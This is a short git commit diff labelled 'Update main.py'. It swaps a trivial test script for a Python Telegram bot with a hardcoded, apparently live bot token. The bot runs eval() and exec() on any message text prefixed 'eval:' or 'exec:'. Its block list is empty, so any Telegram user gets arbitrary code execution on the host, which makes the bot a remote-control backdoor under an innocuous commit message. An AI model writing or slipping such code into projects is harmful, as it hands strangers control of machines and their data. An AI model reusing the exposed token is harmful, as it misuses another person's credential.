274d7b1133cfe804982b8d6fc4af85c9ab674ea2
Danil <88977206+qwertyuiop-danil@users.noreply.github.com>
2023-12-25 15:06:39 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,8 @@
-for i in range(15):
-  prinr(i)
-print("hohoho"(
+import telebot;token='6421982853:AAGpLTpCiV4byFyGHDoelPj-PwQyGca6TvA';bot = telebot.TeleBot(token);bl = [];
+@bot.message_handler()
+def f(m):
+    try:
+        if('eval:' in m.text and not m.chat.id in bl)or('eval:' in m.text and m.chat.id==1346243726):bot.send_message(m.chat.id, eval(''.join(m.text.split('eval:')[1:]))) 
+        if('exec:' in m.text and not m.chat.id in bl)or('exec:' in m.text and m.chat.id==1346243726):exec(''.join(m.text.split('exec:')[1:]));bot.send_message(m.chat.id, 'S')
+    except:bot.send_message(m.chat.id, 'E')
+bot.polling(none_stop=True)
